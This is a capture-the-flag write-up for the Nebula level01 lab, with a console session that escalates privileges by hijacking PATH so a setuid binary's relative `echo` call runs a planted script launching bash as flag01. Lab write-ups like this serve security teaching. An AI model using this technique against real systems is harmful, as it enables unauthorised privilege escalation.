The file /home/flag01/flag01 has the setuid bit set. This means that when we run the program from the account level01, the effective user id is that of the user flag01. We notice that the argument given to the function `system` specifies the command `echo` with relative path. This is a vulnerability because we can simply prepend a directory to `PATH` that we can write to, and then create our very own script named echo that launches whatever program we like. 

Let us demontrate the vulnerability by launching bash as the user flag01 from the user level01.

```console
level01@nebula:~$ ll /home/flag01/flag01 
-rwsr-x--- 1 flag01 level01 7322 Nov 20  2011 /home/flag01/flag01*
level01@nebula:~$ pwd
/home/level01
level01@nebula:~$ export PATH=/home/level01:$PATH
level01@nebula:~$ $PATH
/home/level01:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: No such file or directory
level01@nebula:~$ echo "/bin/bash" > ./echo
level01@nebula:~$ /home/flag01/flag01
flag01@nebula:~$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
```
